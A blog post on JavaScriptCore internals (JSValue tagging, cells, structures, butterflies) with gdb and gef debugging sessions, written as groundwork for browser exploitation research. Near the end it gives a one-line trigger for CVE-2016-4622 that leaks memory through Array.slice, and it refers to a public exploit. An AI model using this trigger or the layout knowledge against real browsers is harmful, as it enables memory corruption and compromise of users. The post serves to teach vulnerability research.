---
layout: post
comments: true
title: "Notes on JavascriptCore"
tags: [Webkit, browser, gdb]
---

In this post I want to add some pratical notes (and maybe a new tool)
to the [paper from saelo](http://phrack.com/papers/attacking_javascript_engines.html)
about exploiting modern browsers; in particular Webkit.

As in his paper, I'll deep dive into the source code of that version of webkit.

Since seems that doesn't exist a documentation for the its code base you
can take this as a getting started if you want to hack its code.

## Fundamental datatypes

Here a brief recap of something already covered by saelo just to have
a self-consistent writeup, however I advice you to read the paper linked
above.

First of all we need to understand the datatypes; take in mind that the
codebase is in ``C++`` and the namespace for the majority of the classes
that we'll encounter will be ``JSC``, so I won't include it explicitely.

The first and most fundamental is the ``JSValue``, that is like the encoding
used internally by JavascriptCore for its datatype; what does it mean? it means
that since this is a Javascript engine, it must have a way to represent primitive
values; the main trick to distinguish between data type is the tagging of the
actual value in memory.

```
0x00 00000000 empty (internal value)
0x02 00000010 null
0x04 00000100 delete (internal value)
0x06 00000110 false
0x07 00000111 true
0x0a 00001010 undefined
         ' '-------------> TagBitTypeOther
          `--------------> TagBitUndefined
```


An interesting part is how the webkit's code deals with some of characteristics
of ``C++`` language: missing ``super`` and ``instanceof``:

 - ``super`` is implemented using the ``ClassInfo``
 - ``instanceof`` is implemented also via ``JSType`` enum


```c++
enum JSType : uint8_t {
    UnspecifiedType,
    UndefinedType,
    BooleanType,
    NumberType,
    NullType,

    // The CellType value must come before any JSType that is a JSCell.
    CellType,
    ...
    // The ObjectType value must come before any JSType that is a subclass of JSObject.
    ObjectType,
    FinalObjectType,
    JSCalleeType,
    JSFunctionType,
    ...
}
```

```c++
inline bool isJSArray(JSCell* cell) { return cell->classInfo() == JSArray::info(); }
inline bool isJSArray(JSValue v) { return v.isCell() && isJSArray(v.asCell()); }

inline const ClassInfo* JSCell::classInfo() const
{
    MarkedBlock* block = MarkedBlock::blockFor(this);
    if (block->needsDestruction() && !(inlineTypeFlags() & StructureIsImmortal))
        return static_cast<const JSDestructibleObject*>(this)->classInfo();
    return structure(*block->vm())->classInfo();
}
```

An example of inheritance is the following in the ``JSArray`` class:

```c++
bool JSArray::getOwnPropertySlot(JSObject* object, ExecState* exec, PropertyName propertyName, PropertySlot& slot)
{
    JSArray* thisObject = jsCast<JSArray*>(object);
    if (propertyName == exec->propertyNames().length) {
        unsigned attributes = thisObject->isLengthWritable() ? DontDelete | DontEnum : DontDelete | DontEnum | ReadOnly;
        slot.setValue(thisObject, attributes, jsNumber(thisObject->length()));
        return true;
    }

    return JSObject::getOwnPropertySlot(thisObject, exec, propertyName, slot);
}
```


### JSCell

``JSCell`` it's the base class for all the runtime data types that need to be
garbage collected somehow. You can think of it as a kind of header for identifying
the real object.

In memory it has the following layout

```
  .----.----.----.----.----.----.----.----.
  |    Structure ID   | in | ty | fl | st |
  '----'----'----'----'----'----'----'----'
                         \    \    \    \_______ CellState
                          \    \    \___________ TypeInfo::InlineTypeFlags
                           \    \_______________ JSType
                            \___________________ IndexingType
```


### Structure

``Structure``: it identifies the class the object belongs to (via the ``m_classInfo`` attribute)
and describe the "layout" of the javascript object, i.e. the actual relation properties/offsets
contained in the ``Butterfly``; moreover, it contains the actual table (data type ``PropertyTable``
in the field ``m_propertyTableUnsafe``) with the list of attributes that are defined and at what offsets.

Another field important is ``m_inlineCapacity`` that tells us how much space for inline properties is
preallocated alongside the object in memory and not stored in the butterfly.

From the code below you can see that the table is placed at the start of the memory
block (described by the class ``MarkedBlock``).

```c++
inline Structure* JSCell::structure() const
{
        return Heap::heap(this)->structureIDTable().get(m_structureID);
}

inline Heap* Heap::heap(const JSCell* cell)
{
        return MarkedBlock::blockFor(cell)->heap();
}

typedef uintptr_t Bits;

inline MarkedBlock* MarkedBlock::blockFor(const void* p)
{
    return reinterpret_cast<MarkedBlock*>(reinterpret_cast<Bits>(p) & blockMask);
}
// Source/JavaScriptCore/heap/MarkedBlock.h``
namespace JSC {
    ...
    class MarkedBlock : public DoublyLinkedListNode<MarkedBlock> {
    ...
    public:
        static const size_t atomSize = 16; // bytes
        static const size_t blockSize = 16 * KB;
        static const size_t blockMask = ~(blockSize - 1); // blockSize must be a power of two.
        ...
    }
    ...
}
```

```c++
class VM : public ThreadSafeRefCounted<VM> {
public:
    // WebCore has a one-to-one mapping of threads to VMs;
    // either create() or createLeaked() should only be called once
    // on a thread, this is the 'default' VM (it uses the
    // thread's default string uniquing table from wtfThreadData).
    // API contexts created using the new context group aware interface
    // create APIContextGroup objects which require less locking of JSC
    // than the old singleton APIShared VM created for use by
    // the original API.
    ...
}
```

```
gef➤  ptype/rom JSC::PropertyTable
/* offset    |  size */  type = class JSC::PropertyTable : public JSC::JSCell {
/*    8      |     4 */    unsigned int m_indexSize;
/*   12      |     4 */    unsigned int m_indexMask;
/*   16      |     8 */    unsigned int *m_index;
/*   24      |     4 */    unsigned int m_keyCount;
/*   28      |     4 */    unsigned int m_deletedCount;
/*   32      |     8 */    class std::unique_ptr<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul>, std::default_delete<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul> > > {
                             private:
/*   32      |     8 */        std::unique_ptr<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul>, std::default_delete<WTF::Vector<int, 0ul, WTF::CrashOnOverflow, 16ul> > >::__tuple_type _M_t;

                               /* total size (bytes):    8 */
                           } m_deletedOffsets;

                           /* total size (bytes):   40 */
                         }
```

The particularity is that the table is at the address obtained
with the sum of ``m_index`` and ``m_indexSize``: this because
the table itself is preceded by a hash table.
``m_keyCount`` gives the number of properties available and if ``m_propertyTableUnsafe`` is ``NULL``
obvioulsy we don't have properties.

```c++
inline PropertyTable::ValueType* PropertyTable::table()
{
    // The table of values lies after the hash index.
    return reinterpret_cast<ValueType*>(m_index + m_indexSize);
}
```

```c++
typedef PropertyMapEntry ValueType;

struct PropertyMapEntry {
    UniquedStringImpl* key;
    PropertyOffset offset;
    uint8_t attributes;
    bool hasInferredType;
    ...
};

typedef int PropertyOffset;

static const PropertyOffset invalidOffset = -1;
static const PropertyOffset firstOutOfLineOffset = 100;
```

**Note:** it seems that properties of the ``JSCell`` are assigned from the corresponding values in the
``Structure`` associated during creation(?), I think for performance reason.

To understand where the properties are located looks in the code

```
WriteBarrierBase<Unknown>* JSObject::locationForOffset(PropertyOffset offset)
{
    if (isInlineOffset(offset))
        return &inlineStorage()[offsetInInlineStorage(offset)];
    return &outOfLineStorage()[offsetInOutOfLineStorage(offset)];
}
```

we have the **inline** storage

```
inline bool JSC::isInlineOffset(PropertyOffset offset)
{
    checkOffset(offset);
    return offset < firstOutOfLineOffset;
}

PropertyStorage JSObject::inlineStorageUnsafe()
{
    return bitwise_cast<PropertyStorage>(this + 1);
}

PropertyStorage JSObject::inlineStorage()
{
    ASSERT(hasInlineStorage());
    return inlineStorageUnsafe();
}
```

and the **outline** storage

```
static const PropertyOffset firstOutOfLineOffset = 100;

ConstPropertyStorage outOfLineStorage() const
{
    return m_butterfly.get(this)->propertyStorage();
}

inline size_t JSC::offsetInOutOfLineStorage(PropertyOffset offset)
{
    validateOffset(offset);
    ASSERT(isOutOfLineOffset(offset));
    return -static_cast<ptrdiff_t>(offset - firstOutOfLineOffset) - 1;
}
```

With all of this in mind, it's good to know that exists a method to calculate
the **base** of the butterfly instance

```c++
inline void* Butterfly::base(Structure* structure)
{
    return base(indexingHeader()->preCapacity(structure), structure->outOfLineCapacity());
}
```

but it's possible also to access elements like an array (``IndexingType.h``)

```c++
JSValue JSObject::tryGetIndexQuickly(unsigned i) const
{
    Butterfly* butterfly = m_butterfly.get(this);
    switch (indexingType()) {
    case ALL_BLANK_INDEXING_TYPES:
    case ALL_UNDECIDED_INDEXING_TYPES:
        break;
    case ALL_INT32_INDEXING_TYPES:
        if (i < butterfly->publicLength()) {
            JSValue result = butterfly->contiguous()[i].get();
            ASSERT(result.isInt32() || !result);
            return result;
        }
        break;
    case ALL_CONTIGUOUS_INDEXING_TYPES:
        if (i < butterfly->publicLength())
            return butterfly->contiguous()[i].get();
        break;
    case ALL_DOUBLE_INDEXING_TYPES: {
        if (i >= butterfly->publicLength())
            break;
        double result = butterfly->contiguousDouble()[i];
        if (result != result)
            break;
        return JSValue(JSValue::EncodeAsDouble, result);
    }
    case ALL_ARRAY_STORAGE_INDEXING_TYPES:
        if (i < butterfly->arrayStorage()->vectorLength())
            return butterfly->arrayStorage()->m_vector[i].get();
        break;
    default:
        RELEASE_ASSERT_NOT_REACHED();
        break;
    }
    return JSValue();
}
```

```c++
#define ARRAY_WITH_ARRAY_STORAGE_INDEXING_TYPES \
    ArrayWithArrayStorage:                      \
    case ArrayWithSlowPutArrayStorage
    
#define ALL_ARRAY_STORAGE_INDEXING_TYPES                \
    NonArrayWithArrayStorage:                           \
    case NonArrayWithSlowPutArrayStorage:               \
    case ARRAY_WITH_ARRAY_STORAGE_INDEXING_TYPES

```

```c++
class IndexingHeader {

private:
    union {
        struct {
            uint32_t publicLength; // The meaning of this field depends on the array type, but for all JSArrays we rely on this being the publicly visible length (array.length).
            uint32_t vectorLength; // The length of the indexed property storage. The actual size of the storage depends on this, and the type.
        } lengths;
        
        struct {
            ArrayBuffer* buffer;
        } typedArray;
    } u;
};
```

**Note:** the ``Butterfly`` uses for taking outoflinestorage and indexing properties a wrapper
datatype named ``IndexingHeader`` *moved by 1*


### Butterfly

``Butterfly`` it's a class without properties, mainly used to "cast" and wrap
the data structure holding the actual data

The way in which the pointer to a butterfly is used cause the code that returns
the pointer to it to make some magic with pointer arithmetics:

```c++
inline Butterfly* Butterfly::createUninitialized(VM& vm, JSCell* intendedOwner, size_t preCapacity, size_t propertyCapacity, bool hasIndexingHeader, size_t indexingPayloadSizeInBytes)
{
    void* temp;
    size_t size = totalSize(preCapacity, propertyCapacity, hasIndexingHeader, indexingPayloadSizeInBytes);
    RELEASE_ASSERT(vm.heap.tryAllocateStorage(intendedOwner, size, &temp));
    Butterfly* result = fromBase(temp, preCapacity, propertyCapacity);
    return result;
}

static Butterfly* JSC::Butterfly::fromBase(void* base, size_t preCapacity, size_t propertyCapacity)
{
    return reinterpret_cast<Butterfly*>(static_cast<EncodedJSValue*>(base) + preCapacity + propertyCapacity + 1);
}
```

indeed the size is calculated in the following way

```c++
static size_t totalSize(size_t preCapacity, size_t propertyCapacity, bool hasIndexingHeader, size_t indexingPayloadSizeInBytes)
{
    ASSERT(indexingPayloadSizeInBytes ? hasIndexingHeader : true);
    ASSERT(sizeof(EncodedJSValue) == sizeof(IndexingHeader));
    return (preCapacity + propertyCapacity) * sizeof(EncodedJSValue) + (hasIndexingHeader ? sizeof(IndexingHeader) : 0) + indexingPayloadSizeInBytes;
}

inline size_t JSObject::butterflyTotalSize()
{
    Structure* structure = this->structure();
    Butterfly* butterfly = this->butterfly();
    size_t preCapacity;
    size_t indexingPayloadSizeInBytes;
    bool hasIndexingHeader = this->hasIndexingHeader();

    if (UNLIKELY(hasIndexingHeader)) {
        preCapacity = butterfly->indexingHeader()->preCapacity(structure);
        indexingPayloadSizeInBytes = butterfly->indexingHeader()->indexingPayloadSizeInBytes(structure);
    } else {
        preCapacity = 0;
        indexingPayloadSizeInBytes = 0;
    }

    return Butterfly::totalSize(preCapacity, structure->outOfLineCapacity(), hasIndexingHeader, indexingPayloadSizeInBytes);
}
```

## JSObject

In memory a ``JSObject`` is composed by only two quadword as "header", followed
of a couple of inline properties:

```
    .----.----.----.----.----.----.----.----.----.----.----.----.----.----.----.----.
    |                 JSCell                |               Butterfly               |
     ----'----'----'----'----'----'----'----'----'----'----'----'----'----'----'----
    |           properties inline 0         |           property inline 1           |
     ----'----'----'----'----'----'----'----'----'----'----'----'----'----'----'----'
    |                                                                               |

```

## Arrays

From ``ArrayStorage.h``

```c++
namespace JSC {

// This struct holds the actual data values of an array. A JSArray object points to its contained ArrayStorage
// struct by pointing to m_vector. To access the contained ArrayStorage struct, use the getStorage() and 
// setStorage() methods. It is important to note that there may be space before the ArrayStorage that 
// is used to quick unshift / shift operation. The actual allocated pointer is available by using:
//     getStorage() - m_indexBias * sizeof(JSValue)
// All slots in ArrayStorage (slots from 0 to vectorLength) are expected to be initialized to a JSValue or,
// for hole slots, JSValue().
struct ArrayStorage {
    ...
};

} // namespace JSC

```

From ``IndexingType.h``

```c++
/*
    Structure of the IndexingType
    =============================
    Conceptually, the IndexingType looks like this:

    struct IndexingType {
        uint8_t isArray:1;                    // bit 0
        uint8_t shape:4;                      // bit 1 - 3
        uint8_t mayHaveIndexedAccessors:1;    // bit 4
    };

    The shape values (e.g. Int32Shape, ContiguousShape, etc) are an enumeration of
    various shapes (though not necessarily sequential in terms of their values).
    Hence, shape values are not bitwise exclusive with respect to each other.
*/
```

The way the array-like objects are classified are a little tricky

 - **contiguous:** the entries are ``JSValue`` instances
 - **int32**, **double**, etc: the entries are stored as not encoded values

```c++
static inline bool JSC::hasAnyArrayStorage(IndexingType indexingType)
{
    return static_cast<uint8_t>(indexingType & IndexingShapeMask) >= ArrayStorageShape;
}

static inline bool JSC::hasIndexedProperties(IndexingType indexingType)
{
    return (indexingType & IndexingShapeMask) != NoIndexingShape;
}

inline bool Structure::hasIndexingHeader(const JSCell* cell) const
{
    if (hasIndexedProperties(indexingType()))
        return true;

    if (!isTypedView(m_classInfo->typedArrayStorageType))
        return false;

    return jsCast<const JSArrayBufferView*>(cell)->mode() == WastefulTypedArray;
}
```

## GDB manual session

To make sense of what I'm talking about, I'll try to analyze the running
code with ``gdb`` and the actual vulnerable version of the code. I found
that the most reliable way to compile the code is to use docker and a ``debian:jesse``
base image (I have a Dockerfile in my [repository](https://github.com/gipi/cve-cemetery)
for that).

Instead of using a webkit browser is simpler to use the javascript console (``jsc``)
directly from the build directory; as a PoC I'll use the saelo's [one](https://github.com/saelo/jscpwn).

Exists a very comfortable function to evaluate the vulnerability:

```
./obj-x86_64-linux-gnu/bin/jsc /opt/jscpwn/pwn.js /opt/jscpwn/utils.js  /opt/jscpwn/int64.js  -i
>>> isVulnerable()
true
```

Now we are good to go: I try to create an object in the console

```
>>> a = {a: 1, b:2, c:3}
[object Object]
>>> describe(a)
Cell: 0x55e56899be40 (0x55e5689e8d00:[Object, {a:0, b:1, c:2}, NonArray, Proto:0x55e5689c3ff0, Leaf]), ID: 348
```

and after attaching to the process with ``gdb`` I can inspect the memory, first
by simply printing the quadword and then dereferencing the address
as a ``JSC::JSCell`` (``gdb`` needs that the type is enclosed by single
quote otherwise goes banana).

Here below a summary with some lines removed for clarity

```
gef➤  x/60xg 0x55e56899be40
0x55e56899be40: 0x010016000000015c      0x0000000000000000
0x55e56899be50: 0xffff000000000001      0xffff000000000002
0x55e56899be60: 0xffff000000000003      0x0000000000000000
0x55e56899be70: 0x0000000000000000      0x0000000000000000
gef➤  print *('JSC::JSCell'*) 0x55e56899be40
$9 = {
  static StructureFlags = 0x0, 
  static needsDestruction = 0x0, 
  static TypedArrayStorageType = JSC::NotTypedArray, 
  m_structureID = 0x15c, 
  m_indexingType = 0x0, 
  m_type = JSC::FinalObjectType, 
  m_flags = 0x0, 
  m_cellState = JSC::CellState::NewWhite
}
```

As you can see, the three properties's values are "inlined" with no butterfly; now
I want to try to find the corresponding ``Structure`` in memory: ``m_structureID``
contains the index in the array where the element is located.

By the way, if you want to know the definition of a datatype inside ``gdb`` you can
use the ``ptype`` command

```
gef➤  help ptype
Print definition of type TYPE.
Usage: ptype[/FLAGS] TYPE | EXPRESSION
Argument may be any type (for example a type name defined by typedef,
or "struct STRUCT-TAG" or "class CLASS-NAME" or "union UNION-TAG"
or "enum ENUM-TAG") or an expression.
The selected stack frame's lexical context is used to look up the name.
Contrary to "whatis", "ptype" always unrolls any typedefs.

Available FLAGS are:
  /r    print in "raw" form; do not substitute typedefs
  /m    do not print methods defined in a class
  /M    print methods defined in a class
  /t    do not print typedefs defined in a class
  /T    print typedefs defined in a class
  /o    print offsets and sizes of fields in a struct (like pahole)

gef➤  ptype/om JSC::JSCell
/* offset    |  size */  type = class JSC::JSCell {
                         public:
                           static const unsigned int StructureFlags;
                           static const bool needsDestruction;
                           static const enum JSC::TypedArrayType TypedArrayStorageType;
                         private:
/*    0      |     4 */    JSC::StructureID m_structureID;
/*    4      |     1 */    JSC::IndexingType m_indexingType;
/*    5      |     1 */    enum JSC::JSType m_type;
/*    6      |     1 */    JSC::TypeInfo::InlineTypeFlags m_flags;
/*    7      |     1 */    enum JSC::CellState m_cellState;

                           /* total size (bytes):    8 */
                         }
```

Sometimes reaching the right instance of an object is a little tricky, but
from ``gdb`` is possible to create magic spells if like this below to reach
the structure describing the object properties:

```
gef➤  print *('JSC::Structure'*)(('JSC::MarkedBlock'*)( 0x55e56899be40 & ~(16*1024 - 1)))->m_weakSet.m_vm->heap->m_structureIDTable.m_table.get()[348]
$22 = {
  <JSC::JSCell> = {
    static StructureFlags = 0x0,
    static needsDestruction = 0x0,
    static TypedArrayStorageType = JSC::NotTypedArray,
    m_structureID = 0x1,
    m_indexingType = 0x0,
    m_type = JSC::CellType,
    m_flags = 0x20,
    m_cellState = JSC::CellState::NewWhite
  },
  ...
  m_blob = {
    u = {
      fields = {
        structureID = 0x15c,
        indexingType = 0x0,
        type = JSC::FinalObjectType,
        inlineTypeFlags = 0x0,
        defaultCellState = JSC::CellState::NewWhite
      },
      words = {
        word1 = 0x15c,
        word2 = 0x1001600
      },
      doubleWord = 0x10016000000015c
    }
  },
  ...
  m_prototype = {
    <JSC::WriteBarrierBase<JSC::Unknown>> = {
      m_value = 0x55e5689c3ff0
    }, <No data fields>},
  ...
  m_propertyTableUnsafe = {
    <JSC::WriteBarrierBase<JSC::PropertyTable>> = {
      m_cell = 0x55e5689925c0
    }, <No data fields>},
  ...
  m_offset = 0x2,
  m_inlineCapacity = 0x6,
  ...
}
```

Now I want to try something involving the butterfly: from the ``jsc``'s prompt I insert an object
with more than six properties

```js
>>> a = {a:1, b:2, c:3, d:4, e:5, f:6, g:7}
[object Object]
>>> b = {h:8, i:9, l:10, m:11, n:12, o:13, p:14}
[object Object]
>>> describe(a)
Cell: 0x563afd783d80 (0x563afd82f100:[Object, {a:0, b:1, c:2, d:3, e:4, f:5, g:100}, NonArray, Proto:0x563afd7abff0, Leaf]), ID: 378
>>> describe(b)
Cell: 0x563afd783d40 (0x563afd82ed00:[Object, {h:0, i:1, l:2, m:3, n:4, o:5, p:100}, NonArray, Proto:0x563afd7abff0, Leaf]), ID: 385
>>> a[0] = 0xabad1d3a
2880249146
>>> a.kebab = 34
34
>>> a.jeova = 17
17
>>> a.miao = 99
99
```

and to make easier to use the instance I'll set a **convenience variable** in ``gdb``:
in this way the variable has a proper type and can access the methods of the class
(I think there are some limitations but for now is ok)

```
gef➤  set $obj = (('JSC::JSObject'*) 0x563afd783d80)
gef➤  x/10xg $obj
0x563afd783d80: 0x0100160600000188      0x0000563afd81a748
0x563afd783d90: 0xffff000000000001      0xffff000000000002
0x563afd783da0: 0xffff000000000003      0xffff000000000004
0x563afd783db0: 0xffff000000000005      0xffff000000000006
0x563afd783dc0: 0x0100160000000173      0x0000000000000000
```

indeed we can ask for a dump of the butterfly from its base

```
gef➤  x/20xg $obj->butterfly()->base($obj->structure())
0x563afd81a720: 0xffff000000000063      0xffff000000000011
0x563afd81a730: 0xffff000000000022      0xffff000000000007
0x563afd81a740: 0x0000000400000001      0x41e575a3a7400000
0x563afd81a750: 0x7ff8000000000000      0x7ff8000000000000
0x563afd81a760: 0x7ff8000000000000      0x0000000000000000
0x563afd81a770: 0x0000000000000000      0x0000000000000000
0x563afd81a780: 0x0000000000000000      0x0000000000000000
0x563afd81a790: 0x0000000000000000      0x0000000000000000
0x563afd81a7a0: 0x0000000000000000      0x0000000000000000
0x563afd81a7b0: 0x0000000000000000      0x0000000000000000
```

or from the "central pointer"

```
gef➤  x/20xg $obj->butterfly()
0x563afd81a748: 0x41e575a3a7400000      0x7ff8000000000000
0x563afd81a758: 0x7ff8000000000000      0x7ff8000000000000
0x563afd81a768: 0x0000000000000000      0x0000000000000000
0x563afd81a778: 0x0000000000000000      0x0000000000000000
0x563afd81a788: 0x0000000000000000      0x0000000000000000
0x563afd81a798: 0x0000000000000000      0x0000000000000000
0x563afd81a7a8: 0x0000000000000000      0x0000000000000000
0x563afd81a7b8: 0x0000000000000000      0x0000000000000000
0x563afd81a7c8: 0x0000000000000000      0x0000000000000000
0x563afd81a7d8: 0x0000000000000000      0x0000000000000000
```

Probably the best way to interact is using convenience variables
since is more portable with respect to resolve each field and subfield.

## GEF

Now that we have done some homeworks, we can try to power up the game creating a tool
(or improving one in our case) in order to make all simpler for future adventures: we can
try to extend ``gef`` ([github repo here](https://github.com/hugsy/gef)) a ``gdb`` extension(?) for security research.

Remember if you have problem when you are writing code for gef that is possible to enable
the debugging so to have a clean traceback when errors happen

```
gef➤  gef config gef.debug true
gef➤  gef config gef.debug
─────────────────────────────── GEF configuration setting: gef.debug ───────────────────────────────
gef.debug (bool) = True

Description:
        Enable debug mode for gef
```

and to avoid to restart ``gdb`` when you change the script code you can do ``source /path/to/script.py``
to reload it; take in mind that all the classes and functions are available in the python environment
that can be accessed in ``gdb`` using the command ``pi``. ``py`` is used for one liner.

``gef`` uses the gdb's internal python API to create some commands: in our case we want to add a way
to visualize clearly the value in memory of the javascript objects.

The main data type in ``gdb`` is the ``Value`` class, it is a wrapper around a value of course
and allows to interact with the API

```
gef➤  pi
>>> addr = gdb.Value(0x55791e11fe00)
```

if we want to cast this address so to reference a specific type, like ``JSC::JSCell``
I can use the ``gdb.lookup_type()`` function

```
>>> jsc_cell_type = gdb.lookup_type('JSC::JSCell')
```

(obviously ``gdb`` must know about this type, this means you have loaded a binary
with the simbol loaded, maybe debug symbols?).

I cannot indicate explicitely a pointer (``JSC::JSCell``*) but instead I have to use
the ``pointer()`` method

```
>>> jsc_cell_type_pointer = jsc_cell_type.pointer()
```

At this point I can use

```
>>> addr.cast(jsc_cell_type_pointer)
<gdb.Value object at 0x7f9750287e70>
>>> print(addr.cast(jsc_cell_type_pointer))
0x55791e11fe00
>>> print(addr.cast(jsc_cell_type_pointer).dereference())
{
  static StructureFlags = 0x0, 
  static needsDestruction = 0x0, 
  static TypedArrayStorageType = JSC::NotTypedArray, 
  m_structureID = 0x163, 
  m_indexingType = 0x0, 
  m_type = JSC::FinalObjectType, 
  m_flags = 0x0, 
  m_cellState = JSC::CellState::NewWhite
}
```

It is also possible to parse ``gdb``'s commands via ``gdb.parse_and_eval()``

```
gef➤  set $obj = ('JSC::JSCell'*) 0x55791e11fe00
>>> print(gdb.parse_and_eval('*$obj'))
{
  static StructureFlags = 0x0, 
  static needsDestruction = 0x0, 
  static TypedArrayStorageType = JSC::NotTypedArray, 
  m_structureID = 0x163, 
  m_indexingType = 0x0, 
  m_type = JSC::FinalObjectType, 
  m_flags = 0x0, 
  m_cellState = JSC::CellState::NewWhite
}
```

Obviously is possible to set convenience variables also using the python API

```
>>> obj = addr.cast(jsc_cell_type_pointer)
>>> gdb.set_convenience_variable('miao', obj)
>>> print(gdb.parse_and_eval('*$miao'))
{
  static StructureFlags = 0x0, 
  static needsDestruction = 0x0, 
  static TypedArrayStorageType = JSC::NotTypedArray, 
  m_structureID = 0x163, 
  m_indexingType = 0x0, 
  m_type = JSC::FinalObjectType, 
  m_flags = 0x0, 
  m_cellState = JSC::CellState::NewWhite
}
```

## Case study: CVE-2016-4622

Now that we have a deeper understanding of the ``JSC`` internals should be easier understand
what saelo was talking about.

To automatize the analysis you can use the following ``gdb``'s [script]({{ site.baseurl }}/public/code/javascriptcore/bp.gdb)

```
obj = {a: 1, b:2}
>>> a = [];for (var i = 0; i < 100; i++)a.push(i + 13.37);var b = a.slice(0, {valueOf: function() { a.length = 0;c=[obj];return 4;}});b
13.37,14.37,8.4879831644e-314,4.6843036111784e-310
```


## Links

 - [printers.py](http://www.cs.ru.nl/~gdal/dotfiles/.gdb/printers/python/libstdcxx/v6/printers.py)
 - [Thinking outside the JIT Compiler: Understanding and bypassing StructureID Randomization with generic and old-school methods](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)
 - [Hack The Real: An exploitation chain to break Safari browser](https://gts3.org/2019/Real-World-CTF-2019-Safari.html)
